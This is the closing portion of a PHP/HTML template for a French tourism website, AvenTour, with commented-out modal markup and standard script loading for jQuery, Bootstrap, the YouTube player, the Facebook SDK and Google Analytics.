										<!-- <div class="modal-header" style="background-color: rgb(1, 2, 21);">
											<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
											<h4 class="modal-title" id="project-11-label">AvenTour : Visite touristique avec un particulier</h4>
										</div> -->
										<!-- <div class="modal-body" style="background-color: rgb(1, 2, 21);">
											<h3></h3>
 -->
											<!-- <div class="row">
												<div class="col-md-12"> -->
													
													<!-- <section class="bg-primary" id="monsectionQuoi">

													<div class="container" id="mail"> -->
			

				 
 <?php include 'creationaventour.php' ?>

			
		<!-- </div>

														
													</section> -->
												<!-- </div>
											</div> -->
										<!-- </div> -->
										<!-- <div class="modal-footer">
											<button type="button" class="btn btn-sm btn-default" data-dismiss="modal">Close</button>
										</div> -->
									</div>
								</div>
							</div>
							<!-- Modal end -->

							<!-- 8888888888888888888888888888888888888888888
							8888888888888888888888888888888888888888888
							8888888888888888888888888888888888888888888 -->


							<!-- Modal -->
							<div class="modal fade" id="project-13" tabindex="-1" role="dialog" aria-labelledby="project-13-label" aria-hidden="true">
								<div class="modal-dialog modal-lg">
									<!-- <div class="modal-content"> -->
										<!-- div class="modal-header" style="background-color: rgb(1, 2, 21);">
											<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
											
										</div> -->
										<!-- <div class="modal-body" style="background-color: rgb(1, 2, 21);"> -->
											

											
			
                                                            <?php //include 'sign.php' ?>
														
													
												
										<!-- <div class="modal-footer">
											<button type="button" class="btn btn-sm btn-default" data-dismiss="modal">Close</button>
										</div> -->
									<!-- </div> -->
								</div>
							</div>
							<!-- Modal end -->

		<!-- JavaScript files placed at the end of the document so the pages load faster
		================================================== -->

		<!-- Initialization of Plugins -->
		<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/fr_FR/sdk.js#xfbml=1&version=v2.6&appId=731663666968594";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>


		


		<!-- // <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js" type="text/javascript" charset="utf-8"></script> -->
		<script   src="https://code.jquery.com/jquery-2.2.3.min.js"></script>

		 <script type="text/javascript" src="bootstrap/js/bootstrap.min.js"></script> 

		<!-- Modernizr javascript -->
		<!-- // <script type="text/javascript" src="plugins/modernizr.js"></script> -->

		<!-- Isotope javascript -->
		<!-- // <script type="text/javascript" src="plugins/isotope/isotope.pkgd.min.js"></script> -->
		
		<!-- Backstretch javascript -->
		 <script type="text/javascript" src="plugins/jquery.backstretch.min.js"></script>

		<!-- Appear javascript -->
		<!-- // <script type="text/javascript" src="plugins/jquery.appear.js"></script> -->
		<script src="lib/waypoint/noframework.waypoints.min.js"></script>
<!-- Initialization of Plugins -->
		<script type="text/javascript" src="js/template.js"></script>
		
		<script type="text/javascript" src="js/template1.js"></script>

<script type="text/javascript" charset="utf-8">
           var textToggle = function(text) { $("#toggle").text("currently at " + text);                      };
            //var banner = document.getElementById('banner-caption');
            

            $(window).bind('fullscreen-toggle', function(e, state) { textToggle(state); 
            	//isFullScreen=state; 
                 myFunction(state);
                        
              });

            $(function() {
                textToggle($(window).data('fullscreen-state'));
                //isFullScreen=$(window).data('fullscreen-state'); 
                 myFunction($(window).data('fullscreen-state'));
            });

            var tag = document.createElement('script');
      tag.src = "http://www.youtube.com/player_api";
      var firstScriptTag = document.getElementsByTagName('script')[0];
      firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

      // 3. This function creates an <iframe> (and YouTube player)
      //    after the API code downloads.
      var player;
      function onYouTubePlayerAPIReady() {
        player = new YT.Player('videoReunion0', {
          playerVars: { 'autoplay': 0, 'controls': 1,'autohide':1,'wmode':'opaque', 'rel': 0,  'showinfo': 0 },
          videoId: '97IYfZ8dx7o',
          events: {
            'onReady': onPlayerReady}
        });
      }

      // 4. The API will call this function when the video player is ready.
      function onPlayerReady(event) {
        event.target.mute();
        //player.destroy();
      }
      function mymodal(){
      	//alert('You have scrolled to a thing');
      	$("#project-10").modal("show");
      	//$('#project-10').modal();
      	//$("#project-10").show();



      }



            

             var waypoint = new Waypoint({
  element: document.getElementById('monsectionVideo'),
  handler: function(direction) {
    //alert('You have scrolled to a thing');
    //document.getElementById("videoReunion0").src = "https://www.youtube.com/embed/97IYfZ8dx7o?rel=0&autoplay=1";
    //var player =  iframe.getElementById('videoReunion0');
   // $("#project-10").modal("show");
   <?php 

  if((isset($_SESSION['myid'])&&file_exists('users/'.$_SESSION['myid']))){
   
   	

}elseif(isset($_SESSION['deja0'])){
	

}else{
	echo 'mymodal();';
	$_SESSION['deja0']='true';

}

?>
   
     player.playVideo();

    waypoint.destroy();

  }
})



//              var waypoint1 = new Waypoint({
//   element: document.getElementById('end'),
//   handler: function(direction) {
//     //alert('You have scrolled to a thing');
//     //document.getElementById("videoReunion0").src = "https://www.youtube.com/embed/97IYfZ8dx7o?rel=0&autoplay=1";
//     //var player =  iframe.getElementById('videoReunion0');
//    // $("#project-10").modal("show");
//    mymodal();
//      //player.playVideo();

//     //waypoint1.destroy();

//   }
// })

            

         

        </script>

		<script src="https://www.youtube.com/iframe_api"></script>
		<!-- // <script src="lib/jquery.fullscreen.js" type="text/javascript" charset="utf-8"></script> -->

		
		



		<!-- Custom Scripts -->
		<!--script type="text/javascript" src="js/custom.js"></script>

		<!-- Load SCRIPT.JS which will create datepicker for input field  -->
		<!-- // <script src="js/script.js"></script> -->
		
		
		<!-- // <script type="text/javascript" src="js/bootstrap-datetimepicker.js" charset="UTF-8"></script>   -->
		<!-- // <script type="text/javascript" src="js/locales/bootstrap-datetimepicker.fr.js" charset="UTF-8"></script> -->

	

		
		
		
		<script type="text/javascript">
 //    $('.form_datetime').datetimepicker({
 //        //language:  'fr',
 //        weekStart: 1,
 //        todayBtn:  1,
	// 	autoclose: 1,
	// 	todayHighlight: 1,
	// 	startView: 2,
	// 	forceParse: 0,
 //        showMeridian: 1
 //    });
	// $('.form_date').datetimepicker({
 //        language:  'fr',
 //        weekStart: 1,
 //        todayBtn:  1,
	// 	autoclose: 1,
	// 	todayHighlight: 1,
	// 	startView: 2,
	// 	minView: 2,
	// 	forceParse: 0
 //    });
	// $('.form_time').datetimepicker({
 //        language:  'fr',
 //        weekStart: 1,
 //        todayBtn:  1,
	// 	autoclose: 1,
	// 	todayHighlight: 1,
	// 	startView: 1,
	// 	minView: 0,
	// 	maxView: 1,
	// 	forceParse: 0
 //    });
</script> 





		<!-- Load jQuery from Google's CDN -->
		<!-- Load jQuery UI CSS  -->
		

		<!-- Load jQuery UI Main JS  -->
		<script src="http://code.jquery.com/ui/1.10.3/jquery-ui.js"></script>

		<!-- <script src="http://s.codepen.io/assets/libs/modernizr.js" type="text/javascript"></script> -->

		<!-- <script src='http://cdnjs.cloudflare.com/ajax/libs/bootstrap-validator/0.4.5/js/bootstrapvalidator.min.js'></script> -->

		<!--<script src="js/index.js"></script>-->

		<script>
//   (function() {var s=document.createElement('script');
//     s.type='text/javascript';s.async=true;
//     s.src=('https:'==document.location.protocol?'https':'http') +
//     '://aventournet.groovehq.com/widgets/5992f0e3-3344-4690-b86e-8f60ec4fce76/ticket.js'; var q = document.getElementsByTagName('script')[0];q.parentNode.insertBefore(s, q);})();
// </script>

<!-- <script src="assets/js/custom.js"></script> -->


<!-- 
		<script>
  (function() {var s=document.createElement('script');
  	
    s.type='text/javascript';s.async=true;
    s.src=('https:'==document.location.protocol?'https':'http') +
    '://aventour.groovehq.com/widgets/0106ec5e-e381-49e8-b8b0-f05fc9046c15/ticket.js';
     var q = document.getElementsByTagName('script')[0];
     if(($(window).width() > 767)) {
     q.parentNode.insertBefore(s, q); 
 }else{

 	q.parentNode.removeChild(s);
 }

 })();


</script>


 -->
 

 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-77808821-1', 'auto');
  ga('send', 'pageview');

</script>

<!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-PBFV3K"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-PBFV3K');</script>
<!-- End Google Tag Manager -->




</div><!-- end class="section clearfix object-non-visible" data-animation-effect="fadeIn" style="padding: 0px; -->




	</body>
	</html> 


